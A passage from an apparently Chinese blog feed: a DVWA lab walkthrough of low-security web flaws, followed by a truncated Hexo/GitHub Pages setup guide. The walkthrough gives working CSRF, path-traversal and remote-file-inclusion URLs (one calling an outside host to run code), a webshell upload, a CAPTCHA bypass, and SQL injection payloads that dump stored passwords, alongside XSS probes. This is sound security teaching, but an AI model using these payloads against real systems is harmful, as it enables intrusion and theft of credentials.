forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。</p><p>服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制</p><p>需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。</p><p>我们可以使用短链接来隐藏URL，因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的</p><p>现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。</p><blockquote><p>漏洞利用</p></blockquote><p>构造url<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/csrf/？password_new=password&amp;password_conf=password&amp;Change=Change#" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/csrf/？password_new=password&amp;password_conf=password&amp;Change=Change#</a><br>当受害者点击了这个链接，他的密码就会被改成password</p><p>###File Inclusion（文件包含）<br>File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。</p><p>服务器端对page参数没有做任何的过滤跟检查。服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。</p><blockquote><p>漏洞利用</p></blockquote><p>1.本地文件包含</p><p>构造url<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/fi/？page=/etc/shadow" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/？page=/etc/shadow</a><br>报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径<br>    C:\phpstudy\WWW<br>构造url（绝对路径）<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpstudy\WWW\dvwa\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpstudy\WWW\dvwa\php.ini</a><br>成功读取了服务器的php.ini文件<br>    ; This file attempts to overwrite the original php.ini file. Doesnt always work. magic_quotes_gpc = Off allow_url_fopen = On allow_url_include = On<br>构造url（相对路径）<br>    <a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpstudy\WWW\dvwa\php.ini" target="_blank" rel="noopener">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpstudy\WWW\dvwa\php.ini</a><br>加这么多..\是为了保证到达服务器的C盘根目录</p><p>2.远程文件包含<br>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p><p>在远程服务器192.168.5.12上传一个phpinfo.txt文件，内容如下<br><a href="https://i.loli.net/2018/07/15/5b4b60796ad22.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/07/15/5b4b60796ad22.jpg" class="lazyload"></a></p><p>构造url<br>    <a href="http://127.0.0.1/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt" target="_blank" rel="noopener">http://127.0.0.1/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt</a><br>成功在服务器上执行了phpinfo函数<br>为了增加隐蔽性，可以对<a href="http://192.168.5.12/phpinfo.txt进行编码" target="_blank" rel="noopener">http://192.168.5.12/phpinfo.txt进行编码</a><br>同样可以执行成功</p><p>###File Upload（文件上传）<br>File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。</p><p>服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。</p><blockquote><p>漏洞利用</p></blockquote><p>文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。<br>上传文件hack.php<br><a href="https://i.loli.net/2018/07/15/5b4b60797e4f6.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/07/15/5b4b60797e4f6.jpg" class="lazyload"></a><br>上传成功，并且返回了上传路径</p><p>打开中国菜刀，右键添加，地址栏填入上传文件所在路径<br>    <a href="http://127.0.0.1/dvwa/hackable/uploads/hack.php" target="_blank" rel="noopener">http://127.0.0.1/dvwa/hackable/uploads/hack.php</a><br>参数名（一句话木马口令）为apple<br><a href="https://i.loli.net/2018/07/15/5b4b60799f8f6.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/07/15/5b4b60799f8f6.jpg" class="lazyload"></a></p><p>然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。<br>可以下载、修改服务器的所有文件。可以打开服务器的虚拟终端。</p><p>###Insecure CAPTCHA （不安全的验证码）<br>Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。</p><p>服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。</p><blockquote><p>漏洞利用</p></blockquote><p>1.通过构造参数绕过验证过程的第一步<br>首先输入密码，点击Change按钮，抓包：<br>因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有recaptcha_challenge_field、recaptcha_response_field两个参数）</p><p>更改step参数绕过验证码：<br><a href="https://i.loli.net/2018/07/15/5b4b6079c3d44.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/07/15/5b4b6079c3d44.jpg" class="lazyload"></a></p><p>在Burpsuite中右键send to Repeater，在Repeater中点击go<br>修改密码成功</p><p>###SQL Injection（SQL注入）<br>SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。<br>自动化的注入神器sqlmap</p><blockquote><p>手工注入思路</p></blockquote><p>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解SQL查询语句中的字段数<br>3.确定显示的字段顺序<br>4.获取当前数据库<br>5.获取数据库中的表<br>6.获取表中的字段名<br>7.下载数据</p><blockquote><p>漏洞利用</p></blockquote><p>Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。<br>现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。</p><p>1.判断是否存在注入，注入是字符型还是数字型<br>输入1<br>输入1’and ‘1’ =’2<br>输入1’or ‘1234 ’=’1234<br>返回多个结果，说明存在字符型注入。</p><p>2.猜解SQL查询语句中的字段数<br>输入1′ or 1=1 order by 1 #<br>输入1′ or 1=1 order by 2 #<br>     ……….<br>（这里也可以通过输入union select 1,2,3…来猜解字段数）</p><p>3.确定显示的字段顺序<br>输入1′ union select 1,2 #     ，查询成功：说明执行的SQL语句为select First name,Surname from 表 where ID=’id’…</p><p>4.获取当前数据库<br>输入1′ union select 1,database() #</p><p>5.获取数据库中的表<br>输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</p><p>6.获取表中的字段名<br>输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #</p><p>7.下载数据<br>输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #</p><p>这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。</p><p>###SQL Injection（Blind）（SQL盲注）<br>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p><blockquote><p>手工盲注思路</p></blockquote><p>盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注</p><blockquote><p>手工盲注的步骤（可与之前的手工注入作比较）：</p></blockquote><p>1.判断是否存在注入，注入是字符型还是数字型<br>2.猜解当前数据库名<br>3.猜解数据库中的表名<br>4.猜解表中的字段名<br>5.猜解数据</p><p>Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种</p><blockquote><p>基于布尔的盲注：</p></blockquote><p>1.判断是否存在注入，注入是字符型还是数字型<br>输入1，显示相应用户存在<br>输入1’ and 1=1 #，显示存在<br>输入1’ and 1=2 #，显示不存在<br>说明存在字符型的SQL盲注。</p><p>2.猜解当前数据库名</p><p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p><p>输入1’ and length(database())=1 #，显示不存在；</p><p>输入1’ and length(database())=2 #，显示不存在；</p><p>输入1’ and length(database())=3 #，显示不存在；</p><p>输入1’ and length(database())=4 #，显示存在：</p><p>说明数据库名长度为4。</p><p>下面采用二分法猜解数据库名。</p><p>输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</p><p>输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</p><p>…<br>重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。</p><p>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><p>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在</p><p>1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在<br>说明数据库中共有两个表。</p><p>接着挨个猜解表名：</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在</p><p>…</p><p>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在<br>说明第一个表名长度为9。</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 # 显示存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 # 显示不存在</p><p>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 # 显示不存在</p><p>说明第一个表的名字的第一个字符为小写字母g。</p><p>…</p><p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p><p>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><p>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在</p><p>…</p><p>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在<br>说明users表有8个字段。</p><p>接着挨个猜解字段名：</p><p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在</p><p>…</p><p>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在</p><p>说明users表的第一个字段为7个字符长度。</p><p>采用二分法，即可猜解出所有字段名。</p><p>5.猜解数据</p><p>同样采用二分法。</p><p>还可以使用基于时间的盲注：</p><p>1.判断是否存在注入，注入是字符型还是数字型</p><p>输入1’ and sleep(5) #，感觉到明显延迟；</p><p>输入1 and sleep(5) #，没有延迟；<br>说明存在字符型的基于时间的盲注。</p><p>2.猜解当前数据库名</p><p>首先猜解数据名的长度：</p><p>1’ and if(length(database())=1,sleep(5),1) # 没有延迟</p><p>1’ and if(length(database())=2,sleep(5),1) # 没有延迟</p><p>1’ and if(length(database())=3,sleep(5),1) # 没有延迟</p><p>1’ and if(length(database())=4,sleep(5),1) # 明显延迟<br>说明数据库名长度为4个字符。</p><p>接着采用二分法猜解数据库名：</p><p>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟</p><p>…</p><p>1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟</p><p>1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟</p><p>说明数据库名的第一个字符为小写字母d。</p><p>…<br>重复上述步骤，即可猜解出数据库名。</p><p>3.猜解数据库中的表名</p><p>首先猜解数据库中表的数量：</p><p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟</p><p>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟<br>说明数据库中有两个表。</p><p>接着挨个猜解表名：</p><p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟</p><p>…</p><p>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟<br>说明第一个表名的长度为9个字符。</p><p>采用二分法即可猜解出表名。</p><p>4.猜解表中的字段名</p><p>首先猜解表中字段的数量：</p><p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟</p><p>…</p><p>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟<br>说明users表中有8个字段。</p><p>接着挨个猜解字段名：</p><p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟</p><p>…</p><p>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟<br>说明users表的第一个字段长度为7个字符。</p><p>采用二分法即可猜解出各个字段名。</p><p>5.猜解数据</p><p>同样采用二分法。</p><p>###XSS（Reflected）（反射型跨站脚本）</p><blockquote><p>XSS</p></blockquote><p>XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。<br>DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p><blockquote><p>反射型XSS</p></blockquote><p>代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。</p><blockquote><p><em>漏洞利用</em></p></blockquote><p>输入<br><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>，成功弹框</p><blockquote><p>存储型XSS</p></blockquote><p>对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。</p><blockquote><p>漏洞利用</p></blockquote><p>message一栏输入<br><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code><br>，成功弹框</p><p>name一栏前端有字数限制，抓包改为<br><code>&lt;script&gt;alert(/name/)&lt;/script&gt;</code><br><a href="https://i.loli.net/2018/07/15/5b4b6079e7ca7.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2018/07/15/5b4b6079e7ca7.jpg" class="lazyload"></a><br>成功弹框</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;#DVWA的安装与Low级别的web漏洞&lt;br&gt;    &lt;a href=&quot;http://www.freebuf.com/author/lonehand&quot; target=&quot;_blank&quot;</summary>
        
      
    
    
    
    <category term="Web" scheme="https://kabeor.github.io/categories/Web/"/>
    
    <category term="渗透" scheme="https://kabeor.github.io/categories/Web/%E6%B8%97%E9%80%8F/"/>
    
    <category term="工具集" scheme="https://kabeor.github.io/categories/Web/%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E9%9B%86/"/>
    
    
    <category term="Kali" scheme="https://kabeor.github.io/tags/Kali/"/>
    
    <category term="DVWA" scheme="https://kabeor.github.io/tags/DVWA/"/>
    
    <category term="渗透" scheme="https://kabeor.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Hexo+GitPage搭建个人博客</title>
    <link href="https://kabeor.github.io/Hexo+GitPage%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://kabeor.github.io/Hexo+GitPage%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</id>
    <published>2018-07-14T16:00:00.000Z</published>
    <updated>2020-03-16T04:43:31.956Z</updated>
    
    <content type="html"><![CDATA[<h3 id="终于搭好了。。。顺便把以前写的34篇导了进来，写一下搭建过程吧，感觉如果熟练的话半小时就足够了。。。"><a href="#终于搭好了。。。顺便把以前写的34篇导了进来，写一下搭建过程吧，感觉如果熟练的话半小时就足够了。。。" class="headerlink" title="终于搭好了。。。顺便把以前写的34篇导了进来，写一下搭建过程吧，感觉如果熟练的话半小时就足够了。。。"></a>终于搭好了。。。顺便把以前写的34篇导了进来，写一下搭建过程吧，感觉如果熟练的话半小时就足够了。。。</h3><p>我使用的是Hexo+GitPage搭建个人博客，因为GitPage官网是这样说的</p><pre><code>You get one site per GitHub account and organization, and unlimited project sites. Let‘s get started.</code></pre><p>使用Github Pages可以为你提供一个免费的服务器，免去了自己搭建服务器和写数据库的麻烦。我们只需要在Github拥有一个账户即可，我们将得到一个</p><pre><code>用户名.github.io</code></pre><p>为域名的网址，本篇文章不讨论如何使用自己购买的域名，等我有钱再说吧hhh，那么我们现在开始</p><h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a><strong>搭建</strong></h1><h2 id="1-安装Node-js"><a href="#1-安装Node-js" class="headerlink" title="1. 安装Node.js"></a>1. 安装Node.js</h2><p>在 Windows 环境下安装 Node.js，只需要到官网下载安装即可<br><a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">https://nodejs.org/en/download/</a><br>似乎需要科学上网，自行解决吧</p><p><a href="https://i.loli.net/2018/07/15/5b4b5fc370389.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5fc370389.jpg" class="lazyload"></a></p><p>下载以后一路确认就好</p><h2 id="2-安装Git"><a href="#2-安装Git" class="headerlink" title="2. 安装Git"></a>2. 安装Git</h2><p>windows下载，似乎仍要科学上网</p><p><a href="http://gitforwindows.org/" target="_blank" rel="noopener">http://gitforwindows.org/</a></p><p>安装：点击下一步，像我这样打勾<br><a href="https://i.loli.net/2018/07/15/5b4b5fc394d49.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5fc394d49.jpg" class="lazyload"></a></p><p>在Windows Explorer integration选项中将“Git Bash here”和“Git GUI here”打对勾。<br><a href="https://i.loli.net/2018/07/15/5b4b5fc3a91d4.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5fc3a91d4.jpg" class="lazyload"></a></p><p>在“Adjusting your PATH environment”选项中，默认即可。<br><a href="https://i.loli.net/2018/07/15/5b4b5fc3be1dd.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5fc3be1dd.jpg" class="lazyload"></a></p><p>在“Configuring the line ending conversions”选项中，<br>第一个选项：如果是跨平台项目，在windows系统安装，选择；<br>第二个选项：如果是跨平台项目，在Unix系统安装，选择；<br>第三个选项：非跨平台项目，选择。<br><a href="https://i.loli.net/2018/07/15/5b4b5fc3d16b9.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5fc3d16b9.jpg" class="lazyload"></a><br>选择“Finish”，结束安装。</p><p>桌面右键可以看到Git GUI Here和Git Bash Here（我们将用第二个）</p><p>Pro Git中文教程<a href="http://git.oschina.net/progit/" target="_blank" rel="noopener">http://git.oschina.net/progit/</a></p><h2 id="3-安装Hexo"><a href="#3-安装Hexo" class="headerlink" title="3. 安装Hexo"></a>3. 安装Hexo</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><p>静态网页不会被黑，这就是它的一大好处</p><blockquote><p>安装</p></blockquote><p>桌面右键鼠标，点击Git Bash Here，输入npm命令即可安装</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br><span class="line">npm install hexo --save</span><br><span class="line">#如果命令无法运行，可以尝试更换taobao的npm源</span><br><span class="line">npm install -g cnpm --registry&#x3D;https:&#x2F;&#x2F;registry.npm.taobao.org</span><br></pre></td></tr></table></figure></div><blockquote><p>初始化</p></blockquote><h4 id="创建Hexo文件夹"><a href="#创建Hexo文件夹" class="headerlink" title="创建Hexo文件夹"></a>创建Hexo文件夹</h4><p>安装完成后，根据自己喜好建立目录（如F:\Blog\Hexo），直接进入F:\Blog\Hexo文件夹下右键鼠标，点击Git Bash Here，进入Git命令框，执行以下操作。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo init</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure></div><p>安装 Hexo 完成后，Hexo 将会在指定文件夹中新建所需要的文件。Hexo文件夹下的目录如下：<br><a href="https://i.loli.net/2018/07/15/5b4b5fc3e62b1.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5fc3e62b1.jpg" class="lazyload"></a></p><h4 id="安装Hexo插件"><a href="#安装Hexo插件" class="headerlink" title="安装Hexo插件"></a>安装Hexo插件</h4><p>将下面的插件都安装完。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-category --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-deployer-heroku --save</span><br><span class="line">npm install hexo-deployer-rsync --save</span><br><span class="line">npm install hexo-deployer-openshift --save</span><br><span class="line">npm install hexo-renderer-marked@0.2 --save</span><br><span class="line">npm install hexo-renderer-stylus@0.2 --save</span><br><span class="line">npm install hexo-generator-feed@1 --save</span><br><span class="line">npm install hexo-generator-sitemap@1 --save</span><br></pre></td></tr></table></figure></div><h4 id="本地查看效果"><a href="#本地查看效果" class="headerlink" title="本地查看效果"></a>本地查看效果</h4><p>执行下面语句</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo generate</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure></div><p>登录localhost:4000，即可看到本地的效果如下：<br><a href="https://i.loli.net/2018/07/15/5b4b5fc41a7bc.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5fc41a7bc.jpg" class="lazyload"></a></p><p>在之后修改中，我们可以使用</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure></div><p>来进行本地查看，并且如果你一直开着hexo而修改文件的话，修改会立刻生效，只需要刷新页面即可</p><h2 id="4-将博客部署到Github-Pages上"><a href="#4-将博客部署到Github-Pages上" class="headerlink" title="4. 将博客部署到Github Pages上"></a>4. 将博客部署到Github Pages上</h2><blockquote><p>注册GitHub账户</p></blockquote><blockquote><p>创建代码库，点击New repository</p></blockquote><p>项目名字必须为</p><pre><code>usename.github.io</code></pre><p>这是官方规定的，也是你将来的域名</p><p>在下面的Initialize this repository with a README打勾，然后创建项目库</p><blockquote><p>配置SSH密钥</p></blockquote><p>一  首先查看本机是否存在SSH密钥，打开Git Bash，输入</p><pre><code>$ ls -al ~/.ssh</code></pre><p>如果不存在此目录，则进行第二步操作，否则，你本机已经存在ssh公钥和私钥，可以略过第二步，直接进入第三步操作。</p><p>二  创建一对新的SSH密钥(keys)</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;your_email@example.com&quot;</span><br><span class="line">#这将按照你提供的邮箱地址，创建一对密钥</span><br><span class="line"></span><br><span class="line">Generating public&#x2F;private rsa key pair.</span><br><span class="line">Enter file in which to save the key (&#x2F;c&#x2F;Users&#x2F;you&#x2F;.ssh&#x2F;id_rsa): [Press enter]</span><br></pre></td></tr></table></figure></div><p>直接回车，则将密钥按默认文件进行存储。此时也可以输入特定的文件名，比如/c/Users/you/.ssh/github_rsa</p><p>接着，根据提示，你需要输入密码和确认密码（如果你很放心，可以不用密码，就是到输密码的地方，都直接回车，所以每次push就只管回车就行了)。   相关提示</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Enter passphrase (empty for no passphrase): [Type a passphrase]</span><br><span class="line">Enter same passphrase again: [Type passphrase again]</span><br></pre></td></tr></table></figure></div><p>输入完成之后，屏幕会显示如下信息：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Your identification has been saved in &#x2F;c&#x2F;Users&#x2F;you&#x2F;.ssh&#x2F;id_rsa.</span><br><span class="line">Your public key has been saved in &#x2F;c&#x2F;Users&#x2F;you&#x2F;.ssh&#x2F;id_rsa.pub.</span><br><span class="line">The key fingerprint is:</span><br><span class="line">01:0f:f4:3b:ca:85:d6:17:a1:7d:f0:68:9d:f0:a2:db your_email@example.com</span><br></pre></td></tr></table></figure></div><p>三  在GitHub账户中添加你的公钥</p><p>运行如下命令，将公钥的内容复制到系统粘贴板(clipboard)中。<br>    clip &lt; ~/.ssh/id_rsa.pub</p><p>登陆GitHub,进入你的Account Settings.<br><a href="https://i.loli.net/2018/07/15/5b4b5fc42fd10.jpg" data-fancybox="group" data-caption="mark" class="fancybox"><img alt="mark" title="mark" data-src="https://i.loli.net/2018/07/15/5b4b5fc42fd10.jpg" class="lazyload"></a></p><p>选择SSH Keys<br><a 